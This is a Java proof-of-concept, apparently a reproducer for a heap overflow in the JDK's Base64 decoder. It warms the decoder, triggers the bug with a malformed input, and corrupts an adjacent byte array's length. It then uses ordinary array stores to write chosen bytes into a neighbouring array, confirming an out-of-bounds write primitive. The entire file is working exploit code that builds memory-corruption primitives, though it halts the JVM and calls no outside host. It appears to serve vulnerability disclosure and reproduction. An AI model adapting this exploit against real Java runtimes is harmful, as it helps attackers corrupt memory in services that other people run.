import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;

/**
 * CVE-2026-114938 heap read/write demonstration.
 *
 *   [ dst: 66 ][ victim: 64 ][ target: 64 ]
 *
 * The overflow corrupts the victim's length to 0x699aa669 (~1.77 billion).
 * Java's bounds checks now accept an index past the victim's real 64 bytes,
 * letting us write chosen bytes into the neighbouring target array's data.
 *
 * This is the write counterpart to HeapLeak.  No JVM metadata or code is
 * modified; the JVM is halted before GC sees the corrupted header.
 */
public final class HeapWrite {
    private static volatile int sink;
    private static volatile Object keep;

    public static void main(String[] args) throws Exception {
        int warmup = 200_000;

        for (int i = 0; i < args.length; i++) {
            if ("--warmup".equals(args[i])) {
                warmup = Integer.parseInt(args[++i]);
            } else {
                System.err.println("unknown option: " + args[i]);
                System.exit(2);
            }
        }

        boolean isJdk17 = Runtime.version().feature() <= 17;
        int aCount = isJdk17 ? 128 : 64;
        byte[] valid = repeat((byte) 'A', aCount);
        byte[] malformed = repeat((byte) 'A', aCount + 1);
        malformed[aCount] = (byte) '=';

        Base64.Decoder decoder = Base64.getDecoder();

        byte[] warm = new byte[4096];
        for (int i = 0; i < warmup; i++) sink += decoder.decode(valid, warm);
        Arrays.fill(warm, (byte) 0);

        byte[] dst = new byte[66];
        byte[] victim = new byte[64];
        byte[] target = new byte[64];

        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(victim, (byte) 0x41);
        Arrays.fill(target, (byte) 0x41);
        keep = target;

        sun.misc.Unsafe unsafe = unsafe();
        long lengthOffset = unsafe.arrayBaseOffset(byte[].class) - 4;
        int before = unsafe.getInt(victim, lengthOffset);

        System.out.println("runtime       = " + System.getProperty("java.runtime.version"));
        System.out.println("length before = " + before);
        System.out.flush();

        boolean rejected = false;
        try {
            decoder.decode(malformed, dst);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int after = unsafe.getInt(victim, lengthOffset);
        System.out.println("rejected      = " + rejected);
        System.out.println("length after  = " + after);

        // victim data starts at V+16 and occupies 64 bytes, so the victim
        // object ends at V+80.  The target object starts there; its own
        // 16-byte header means target[0] sits at V+96, i.e. victim index 80.
        // (HeapLeak confirms this: secret[0] shows up at victim[80].)
        int targetData = 80;
        if (after <= targetData + 16) {
            System.out.println("victim not corrupted; layout missed");
            Runtime.getRuntime().halt(1);
        }

        byte[] chosen = new byte[16];
        for (int i = 0; i < chosen.length; i++) chosen[i] = (byte) (0x42 + i);

        // Ordinary Java stores; only the corrupted length lets them pass.
        for (int i = 0; i < chosen.length; i++) {
            victim[targetData + i] = chosen[i];
        }

        boolean ok = true;
        for (int i = 0; i < chosen.length; i++) {
            if (target[i] != chosen[i]) {
                ok = false;
                break;
            }
        }

        System.out.println("target before = 41 41 41 41 41 41 41 41 ...");
        System.out.print("target after  = ");
        for (int i = 0; i < 16; i++) System.out.printf("%02x ", target[i] & 0xff);
        System.out.println();

        if (ok) {
            System.out.println("OOB WRITE REPRODUCED");
            System.out.flush();
            Runtime.getRuntime().halt(0);
        }

        System.out.println("OOB write did not land in the expected neighbour");
        Runtime.getRuntime().halt(1);
    }

    private static byte[] repeat(byte value, int count) {
        byte[] out = new byte[count];
        Arrays.fill(out, value);
        return out;
    }

    private static sun.misc.Unsafe unsafe() throws Exception {
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        return (sun.misc.Unsafe) f.get(null);
    }
}
